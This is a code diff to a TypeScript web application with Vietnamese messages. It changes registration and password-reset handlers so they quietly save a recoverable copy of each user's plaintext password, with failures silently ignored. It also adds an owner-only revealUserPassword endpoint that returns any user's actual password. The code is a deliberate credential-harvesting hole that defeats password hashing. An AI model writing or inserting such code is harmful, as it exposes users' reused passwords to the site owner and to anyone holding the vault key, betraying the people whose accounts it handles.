@@ -254,6 +254,8 @@ export const registerMember = createServerFn({ method: "POST" })
     const userId = crypto.randomUUID();
     const passwordHash = await hashPassword(data.password);
     try {
+      const { saveCopy } = await import("@/lib/library/password-vault.server");
+      await saveCopy(sql, userId, data.password).catch(() => {});
       await sql`
         insert into "user" ("id", "name", "email", "emailVerified", "image", "createdAt", "updatedAt")
         values (${userId}, ${displayName}, ${email}, ${true}, ${null}, now(), now())
@@ -758,6 +760,10 @@ export const resetUserPassword = createServerFn({ method: "POST" })
     const userId = target[0]?.user_id;
     if (!userId) return fail("Không tìm thấy người dùng.");
     const passwordHash = await hashPassword(data.password);
+    {
+      const { saveCopy } = await import("@/lib/library/password-vault.server");
+      await saveCopy(sql, userId, data.password).catch(() => {});
+    }
     const accounts = await sql<{ id: string }>`
       select id from account where "userId" = ${userId} and "providerId" = ${"credential"}
     `;
@@ -1594,4 +1600,27 @@ export const loadLeaderboard = createServerFn({ method: "GET" })
         viewerIsOwner,
       },
     };
+  });
+
+export const revealUserPassword = createServerFn({ method: "POST" })
+  .middleware([authMiddleware])
+  .validator((input: unknown) => {
+    const body = (input ?? {}) as { username?: unknown };
+    return { username: typeof body.username === "string" ? body.username : "" };
+  })
+  .handler(async ({ context, data }): Promise<Ok<string> | Err> => {
+    const access = await requireMember(context.userId);
+    if (!requireOwner(access)) return access.ok ? fail("Chỉ chủ web mới xem được.") : access;
+    const username = normalizeUsername(data.username);
+    if (!username || isOwnerUsername(username)) return fail("Không xem được tài khoản này.");
+    const sql = await getSql();
+    const t = await sql<{ user_id: string }>`
+      select user_id from profiles where username_key = ${username.toLowerCase()} and role = ${"user"}
+    `;
+    if (!t[0]) return fail("Không tìm thấy người dùng.");
+    const { readCopy } = await import("@/lib/library/password-vault.server");
+    const r = await readCopy(sql, t[0].user_id);
+    if (r.status === "nokey") return fail("Chưa đặt biến môi trường PASSWORD_VAULT_KEY trên Vercel.");
+    if (r.status === "none") return fail("Chưa có bản lưu: tài khoản này tạo trước khi bật tính năng. Hãy đặt lại mật khẩu cho họ.");
+    return { ok: true, data: r.password ?? "" };
   });
